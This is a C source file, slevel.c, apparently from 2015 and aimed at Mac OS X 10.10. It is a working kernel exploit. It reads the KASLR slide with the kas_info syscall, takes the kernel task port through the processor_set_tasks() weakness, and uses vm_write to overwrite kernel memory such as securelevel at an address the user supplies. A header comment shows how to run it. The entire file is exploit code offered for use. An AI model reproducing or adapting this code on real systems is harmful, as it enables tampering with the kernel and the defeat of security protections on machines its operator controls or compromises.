/*
*[slevel.c]
*by Josh Pitts
*the.midnite.runr@gmail.com
*2015 for Mac OSX 10.10.2 Build: 14C109
*
*Added functionality from https://github.com/gdbinit/checkidt
* for calculating kaslr slide
*
*
*Originally by:
*nemo@felinemenace.org
*2006 for Mac OSX 10.4.6
*
*
*/

/*
Example: 
# Find securelevel 
$ sudo sysctl -a | grep securelevel
$ kern.securelevel: 0
$ sudo nm /System/Library/Kernels/kernel | grep securelevel
ffffff8000a89478 S ___set___sysctl_set_sym_sysctl__kern_securelevel
ffffff8000b0ba08 S _securelevel  <-- you want this one
ffffff8000a74340 D _sysctl__kern_securelevel
# change to 1
$ sudo ./slevel 0xffffff8000b0ba08 1
$ sudo sysctl -a | grep securelevel
$ kern.securelevel: 1
# change to 0
$ sudo ./slevel 0xffffff8000b0ba08 0
$ sudo sysctl -a | grep securelevel
$ kern.securelevel: 0

*/

#include <mach/mach.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/syscall.h>


#define X86 0
#define X64 1
#define KAS_INFO_KERNEL_TEXT_SLIDE_SELECTOR     (0)     /* returns uint64_t     */
#define KAS_INFO_MAX_SELECTOR           (1)

void error(char *msg)
{
    printf("[!] error: %s\n", msg);
    exit(1);
}

void usage(char *progname)
{
    printf("[+] usage: %s <0xsysctlValueaddr> <value>\n", progname);
    printf("\tIn Yosemite:\n");
    printf("\t$ sudo nm /System/Library/Kernels/kernel | grep securelevel\n");
    printf("\t$ %s 0xffffffff..... 1\n", progname);
    exit(1);
}

// From: https://github.com/gdbinit/checkidt/blob/master/kernel.c#L62
/*
 * retrieve which kernel type are we running, 32 or 64 bits
 */
int32_t get_kernel_type(void)
{
    size_t size = 0;
    int8_t ret = 0;
    sysctlbyname("hw.machine", NULL, &size, NULL, 0);
    char *machine = malloc(size);
    sysctlbyname("hw.machine", machine, &size, NULL, 0);
    
    if (strcmp(machine, "i386") == 0)
    {
        ret = X86;
    }
    else if (strcmp(machine, "x86_64") == 0)
    {
        ret = X64;
    }
    else
    {
        ret = -1;
    }
    
    free(machine);
    return ret;
}

// From: https://github.com/gdbinit/checkidt/blob/master/kernel.c#L147
/*
 * inline asm to use the kas_info() syscall. beware the difference if we want 64bits syscalls!
 * alternative is to use: extern int kas_info(int selector, void *value, size_t *size)
 * doesn't need to be linked against any framework
 */
void get_kaslr_slide(size_t *size, uint64_t *slide)
{
    // this is needed for 64bits syscalls!!!
    // good post about it http://thexploit.com/secdev/mac-os-x-64-bit-assembly-system-calls/
#define SYSCALL_CLASS_SHIFT                     24
#define SYSCALL_CLASS_MASK                      (0xFF << SYSCALL_CLASS_SHIFT)
#define SYSCALL_NUMBER_MASK                     (~SYSCALL_CLASS_MASK)
#define SYSCALL_CLASS_UNIX                      2
#define SYSCALL_CONSTRUCT_UNIX(syscall_number) \
((SYSCALL_CLASS_UNIX << SYSCALL_CLASS_SHIFT) | \
(SYSCALL_NUMBER_MASK & (syscall_number)))
    
    uint64_t syscallnr = SYSCALL_CONSTRUCT_UNIX(SYS_kas_info);
    uint64_t selector = KAS_INFO_KERNEL_TEXT_SLIDE_SELECTOR;
    int result = 0;
    __asm__ ("movq %1, %%rdi\n\t"
             "movq %2, %%rsi\n\t"
             "movq %3, %%rdx\n\t"
             "movq %4, %%rax\n\t"
             "syscall"
             : "=a" (result)
             : "r" (selector), "m" (slide), "m" (size), "a" (syscallnr)
             : "rdi", "rsi", "rdx", "rax"
             );
}

int main(int ac, char **av)
{
    mach_port_t kernel_task;
    kern_return_t err;
    long value = 0;
    long long syscalladdr = 0;
    unsigned long *data2;
    unsigned int data_cnt;
    char **endptr;
    uint64_t kaslr_slide;
    size_t kaslr_size;
    int kernel_type;


    if ( ac!= 3)
        usage(*av);

    if(getuid() && geteuid())
        error("requires root.");

    //From https://github.com/gdbinit/checkidt/blob/master/main.c#L166
    // {
    kernel_type = get_kernel_type();
    if (kernel_type == -1)
    {
        error("Unable to retrieve kernel type.");
        return -1;
    }
    else if (kernel_type == X86)
    {
        error("32 bits kernels not supported.");
        return -1;
    }

    // }

    syscalladdr = strtoul(av[1], endptr, 0);
    value = atoi(av[2]);
    printf("Submitted Address: 0x%llx\n", syscalladdr);
    
    vm_size_t datasize;
    kaslr_size = sizeof(kaslr_size);
    get_kaslr_slide(&kaslr_size, &kaslr_slide);
    printf("Kaslr slide is 0x%llx\n", kaslr_slide);
    syscalladdr += kaslr_slide;
    printf("Address to be modified: 0x%llx\n", syscalladdr);
    
    // change to processor_set_tasks
    // OLD:
    // err = task_for_pid(mach_task_self(), 0, &kernel_task);
    // New from OSXReverser/fG!
    // https://github.com/gdbinit/checkidt/blob/master/main.c#L189
    
    host_t host_port = mach_host_self();
    mach_port_t proc_set_default = 0;
    mach_port_t proc_set_default_control = 0;
    task_array_t all_tasks = NULL;
    mach_msg_type_number_t all_tasks_cnt = 0;
    kern_return_t kr = 0;
    int valid_kernel_port = 0;
    
    kr = processor_set_default(host_port, &proc_set_default);
    if (kr == KERN_SUCCESS)
    {
        kr = host_processor_set_priv(host_port, proc_set_default, &proc_set_default_control);
        if (kr == KERN_SUCCESS)
        {
            kr = processor_set_tasks(proc_set_default_control, &all_tasks, &all_tasks_cnt);
            if (kr == KERN_SUCCESS)
            {
                printf("Found valid kernel port using processor_set_tasks() vulnerability!\n");
                kernel_task = all_tasks[0];
                valid_kernel_port = 1;
            }
        }
    }   

    if ((kr != KERN_SUCCESS) || !MACH_PORT_VALID(kernel_task))
        error("getting kernel task.");

    printf("Kernel_task: %d\n", kernel_task);

    //Write values to stack
    if(vm_write(kernel_task, (vm_address_t) syscalladdr, (vm_address_t)&value, sizeof(value)))
        error("writing argument to submitted address.");

    printf("[+] done!\n");

    return 0;

}
